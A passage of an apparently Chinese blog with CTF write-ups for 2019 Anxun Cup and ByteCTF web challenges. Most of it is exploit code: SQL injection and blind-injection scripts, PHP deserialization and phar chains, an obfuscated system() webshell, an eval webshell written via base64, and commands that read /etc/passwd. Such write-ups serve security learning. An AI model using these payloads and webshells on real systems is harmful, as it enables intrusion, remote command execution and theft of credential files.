&#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=write"</span>, data=data)</span><br><span class="line">    <span class="built_in">return</span> ran_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def comment(id):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">"*/#"</span>,</span><br><span class="line">        <span class="string">'bo_id'</span>: id</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=comment"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="comment"># 读取用户</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/etc/passwd'))"</span></span><br><span class="line">    <span class="comment"># 读取用户目录下的操作历史</span></span><br><span class="line">    <span class="comment"># payload = "select (load_file('/home/www/.bash_history'))"</span></span><br><span class="line">    <span class="comment"># 从操作历史中知道了这么个文件</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = "select (load_file('/tmp/html/.DS_Store'))"</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    login()</span><br><span class="line">    ran_string = write(payload)</span><br><span class="line">    result = re.search(<span class="string">"&lt;tr&gt;&lt;td&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;"</span>+ran_string+<span class="string">"&lt;/td&gt;"</span>, s.get(url).text)</span><br><span class="line">    id = str(result.group(0).split(<span class="string">'&lt;/td&gt;'</span>)[0][8:])</span><br><span class="line">    comment(id)</span><br><span class="line">    result = re.split(<span class="string">"&lt;p&gt;"</span>, s.get(url + <span class="string">"/comment.php?id="</span> + str(id)).text)[2]</span><br><span class="line">    content = result[:result.index(<span class="string">'&lt;/p&gt;'</span>)]</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/14/2019安洵杯刷题记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/14/2019安洵杯刷题记录/" itemprop="url">2019安洵杯刷题记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-14T21:45:27+08:00">
                2020-02-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h2><p>主页页脚有wowouploadimage，github搜索这个名称，即可找到源码。<br>下载之后分析，发现show.php存在反序列化点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysqli_query(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">		    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">"attr"</span>])&#123;</span><br><span class="line">		    		<span class="variable">$attr_temp</span> = str_replace(<span class="string">'\0\0\0'</span>, chr(0).<span class="string">'*'</span>.chr(0), <span class="variable">$row</span>[<span class="string">"attr"</span>]);</span><br><span class="line">					<span class="variable">$attr</span> = unserialize(<span class="variable">$attr_temp</span>);</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键是控制att，upload.php中写入att的代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_ext</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="variable">$my_ext</span> = array(<span class="string">"width"</span>=&gt;<span class="variable">$img_ext</span>[0],<span class="string">"height"</span>=&gt;<span class="variable">$img_ext</span>[1]);</span><br><span class="line"><span class="variable">$array</span>[<span class="string">"attr"</span>] = serialize(<span class="variable">$my_ext</span>);</span><br></pre></td></tr></table></figure></p>
<p>att为序列化的图片长宽，插入数据库的sql为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,<span class="variable">$sql_fields</span>)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,<span class="variable">$sql_val</span>)).<span class="string">")"</span>;</span><br></pre></td></tr></table></figure></p>
<p>发现只有filename也就是title是没有过滤的,正常上传的sql为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'test'</span>,<span class="string">'f20c76cc4fb41838.jpg'</span>,<span class="string">'jpg'</span>,<span class="string">'pic/f20c76cc4fb41838.jpg'</span>,<span class="string">'a:2:&#123;s:5:"width";i:1264;s:6:"height";i:992;&#125;'</span>)</span><br></pre></td></tr></table></figure></p>
<p>构造filename为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">','</span>1<span class="string">','</span>1<span class="string">','</span>1<span class="string">',payload),('</span>1.jpg</span><br></pre></td></tr></table></figure></p>
<p>链子很好找，exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class helper &#123;</span><br><span class="line">    protected <span class="variable">$ifview</span> = True; </span><br><span class="line">    protected <span class="variable">$config</span> = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new helper();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">//payload:   O:6:<span class="string">"helper"</span>:2:&#123;s:9:<span class="string">"*ifview"</span>;b:1;s:9:<span class="string">"*config"</span>;s:5:<span class="string">"/flag"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为源码中在存取过程中对protected类型的属性进行了处理，pyload改为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:<span class="string">"helper"</span>:2:&#123;s:9:<span class="string">"\0\0\0ifview"</span>;b:1;s:9:<span class="string">"\0\0\0config"</span>;s:5:<span class="string">"/flag"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为上传的文件名中不能有双引号，所以将payload进行16进制编码,最终文件名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">','</span>1<span class="string">','</span>1<span class="string">','</span>1<span class="string">',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('</span>1.jpg</span><br></pre></td></tr></table></figure></p>
<p>上传之后访问show.php即可</p>
<h2 id="CSS-Game"><a href="#CSS-Game" class="headerlink" title="CSS Game"></a>CSS Game</h2><p>暂时不想做css的题，以后再更<br>if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=’admin’)),1,1))&gt;0),1,0)</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/11/2019bytectfs刷题记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/11/2019bytectfs刷题记录/" itemprop="url">2019bytectfs刷题记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-11T16:45:27+08:00">
                2020-02-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="EZCMS"><a href="#EZCMS" class="headerlink" title="EZCMS"></a>EZCMS</h2><p><a href="http://www.zip出源码" target="_blank" rel="noopener">www.zip出源码</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">login</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">"********"</span>;</span><br><span class="line">    setcookie(<span class="string">"hash"</span>, md5(<span class="variable">$secret</span>.<span class="string">"adminadmin"</span>));</span><br><span class="line">    <span class="built_in">return</span> 1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">is_admin</span></span>()&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">"********"</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">'username'</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_SESSION</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">"admin"</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">'user'</span>] === md5(<span class="variable">$secret</span>.<span class="variable">$username</span>.<span class="variable">$password</span>))&#123;</span><br><span class="line">            <span class="built_in">return</span> 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里是一个很明显的哈希长度扩展攻击，知道secret长度，知道data，知道secret+data的md5值<br>用hashpumb工具附<a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">git链接</a><br><img src="https://uploader.shimo.im/f/AIORQ7sXFTEvcGQu.png!thumbnail" alt><br>得到cookie user值和password 把\x换成% 登陆，然后再添加cookie值<br>现在可以上传文件了，先上传一个jpg试一下，结果访问的时候500，一脸懵逼<br>后来才知道，是因为每次访问upload.php的时候都会生成一个无法解析的.htaccess文件，导致/sandox目录在访问的时候500<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_file(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>))&#123;</span><br><span class="line">            file_put_contents(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>, <span class="string">'lolololol, i control all'</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到过滤并不严格<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span> = [<span class="string">'system'</span>,<span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'+'</span>,<span class="string">'passthru'</span>,<span class="string">'`'</span>,<span class="string">'assert'</span>];</span><br><span class="line">        foreach (<span class="variable">$black_list</span> as <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos(<span class="variable">$content</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                die(<span class="string">"your file make me scare"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>先上传一个shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span>=<span class="string">"syste"</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">"m"</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="string">'a'</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在view.php中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = new File(<span class="variable">$file_name</span>, <span class="variable">$file_path</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$file</span>-&gt;view_detail();</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">view_detail</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="variable">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            die(<span class="string">"nonono~"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = mime_content_type(<span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>mime_content_type触发phar反序列化，但是过滤了phar，可以用php://filter/resource=phar://绕过<br>下面有两种攻击思路<br>1.反序列化调用upload_file函数，上传到其他目录获取shell<br>2.重写htaccess内容或者删掉htaccess<br>move_uploaded_file会检测文件是不是由http post上传的，否则会返回false，但是不知道file_tmp，所以这里要用第二种方法<br>调用php内置类 ZipArchive 这个类有个open方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchive :: open （ string <span class="variable">$filename</span> [， int <span class="variable">$flags</span> ]）： mixed</span><br></pre></td></tr></table></figure></p>
<p>第一个参数为文件名，第二个参数可以设置使用的模式。<br>ZipArchive::OVERWRITE 总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖<br>ZipArchive::CREATE 如果不存在则会创建一个zip压缩包<br>可以用这个类的ZipArchive::OVERWRITE模式删除.htaccess文件<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">    public <span class="variable">$checker</span>;    </span><br><span class="line">&#125;</span><br><span class="line">class Profile&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line">    public <span class="variable">$admin</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new File();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker = new Profile();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;username = <span class="string">"/var/www/html/sandbox/2c67ca1eaeadbdc1868d67003072b481/.htaccess"</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;admin = new ZipArchive();</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">"1.phar"</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); //设置stub</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); //添加要压缩的文件</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p>
<p>在view.php触发，然后就可以正常访问之前上传的马了，这里不能再去访问upload.php，因为会重新生成.htaccess文件，所以马的路径要先记下来</p>
<h2 id="BabyBlog"><a href="#BabyBlog" class="headerlink" title="BabyBlog"></a>BabyBlog</h2><p><a href="http://www.zip出源码，有一个二次注入" target="_blank" rel="noopener">www.zip出源码，有一个二次注入</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>-&gt;query(<span class="string">"update article set title='<span class="variable">$title</span>',content='<span class="variable">$content</span>' where title='"</span> . <span class="variable">$row</span>[<span class="string">'title'</span>] . <span class="string">"';"</span>);</span><br></pre></td></tr></table></figure></p>
<p>虽然有过滤，但是盲注还是可以的，直接去注用户名密码，表和列在源码里都已经知道了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">i=1</span><br><span class="line">n=2</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">id=227</span><br><span class="line">url1=<span class="string">"http://7a0207e4-7353-4d05-8d72-3a295a5b04d2.node3.buuoj.cn/edit.php"</span></span><br><span class="line">url2=<span class="string">"http://7a0207e4-7353-4d05-8d72-3a295a5b04d2.node3.buuoj.cn/writing.php"</span></span><br><span class="line">headers=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=68f6427e93bf35581ef68542b67b2b0f"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(3,4):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    m=64</span><br><span class="line">    j=64</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> range(1,8):</span><br><span class="line">        id+=1</span><br><span class="line">        <span class="keyword">if</span> q!=1:</span><br><span class="line">            j=j/2</span><br><span class="line">            <span class="keyword">if</span> n==1:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==0:</span><br><span class="line">                m=m-j</span><br><span class="line">        m=int(m)</span><br><span class="line">        url=<span class="string">"http://7a0207e4-7353-4d05-8d72-3a295a5b04d2.node3.buuoj.cn/edit.php?id=&#123;&#125;"</span>.format(id)</span><br><span class="line">        payload=<span class="string">""</span><span class="string">"1'^(ascii(substr((select(group_concat(username)) from users),&#123;&#125;,1))&gt;&#123;&#125;)^'1"</span><span class="string">""</span>.format(i,m)</span><br><span class="line">        content=<span class="string">"hello"</span>+str(q)</span><br><span class="line">        data=&#123;<span class="string">"title"</span>:payload,</span><br><span class="line">              <span class="string">"content"</span>:content</span><br><span class="line">              &#125;</span><br><span class="line">        a=requests.post(url2,data=data,headers=headers)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        data=&#123;<span class="string">"title"</span>:<span class="string">"1"</span>,</span><br><span class="line">              <span class="string">"content"</span>:<span class="string">"coplove"</span>,</span><br><span class="line">              <span class="string">"id"</span>:id</span><br><span class="line">              &#125;</span><br><span class="line">        a=requests.post(url1,data=data,headers=headers)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        p=requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"coplove"</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            n=1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=0</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">if</span> q==7:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"coplove"</span> <span class="keyword">in</span> p.text:</span><br><span class="line">                flag=flag+chr(m+1)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+chr(m)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
<p>我这个脚本应该是没问题的，能跑出来部分数据，然后目的就是跑出来isvip=1的用户，结果没有，数据库中只有自己注册的账号<br>真是没想到堆叠注入,直接改成vip<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update users <span class="built_in">set</span> isvip=1 <span class="built_in">where</span> username=<span class="string">'cop'</span></span><br><span class="line"><span class="string">';SeT@a=0x757064617465207573657273207365742069737669703D3120776865726520757365726E616D653D27636F7027;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure></p>
<p>然后用replace的/e模式执行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = addslashes(preg_replace(<span class="string">"/"</span> . <span class="variable">$_POST</span>[<span class="string">'find'</span>] . <span class="string">"/"</span>, <span class="variable">$_POST</span>[<span class="string">'replace'</span>], <span class="variable">$row</span>[<span class="string">'content'</span>]));</span><br></pre></td></tr></table></figure></p>
<p>用%00截断末尾的/，因为ini_set被过滤，然后用glob协议可以读文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);system(<span class="string">'cat ../../../../../etc/passwd'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$dh</span> = opendir(<span class="string">"glob:///*"</span>)) &#123;<span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$dh</span>)) !== <span class="literal">false</span>) &#123;<span class="built_in">echo</span> <span class="string">"<span class="variable">$file</span>\n"</span>;&#125;closedir(<span class="variable">$dh</span>);&#125;</span><br></pre></td></tr></table></figure></p>
<p>看到根目录有个readflag，error_log+LD_PRELOAD绕过disable_function执行readflag，是一个计算题，做题的perl脚本<br>上传一个马，方便蚁剑连接上传文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find=.*/e%00&amp;cop=<span class="variable">$file</span>=<span class="string">"php://filter/write=convert.base64-decode/resource=cop.php"</span>;file_put_contents(<span class="variable">$file</span>,<span class="string">"PD9waHAgQGV2YWwoJF9QT1NUWydjb3AnXSk7Pz4="</span>);&amp;regex=1&amp;id=1&amp;replace=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cop'</span>]);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use IPC::Open3;</span><br><span class="line"></span><br><span class="line">my <span class="variable">$pid</span> = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span> )</span><br><span class="line">  or die <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line">my <span class="variable">$r</span>;</span><br><span class="line"><span class="variable">$r</span> = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"<span class="variable">$r</span>"</span>;</span><br><span class="line"><span class="variable">$r</span> = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"<span class="variable">$r</span>"</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="built_in">eval</span> <span class="string">"<span class="variable">$r</span>"</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"<span class="variable">$r</span>\n"</span>;</span><br><span class="line"><span class="built_in">print</span> CHLD_IN <span class="string">"<span class="variable">$r</span>\n"</span>;</span><br><span class="line"><span class="variable">$r</span> = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"<span class="variable">$r</span>"</span>;</span><br><span class="line"><span class="variable">$r</span> = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"<span class="variable">$r</span>"</span>;</span><br><span class="line"><span class="variable">$r</span> = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"<span class="variable">$r</span>"</span>;</span><br><span class="line"><span class="variable">$r</span> = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"<span class="variable">$r</span>"</span>;</span><br></pre></td></tr></table></figure>
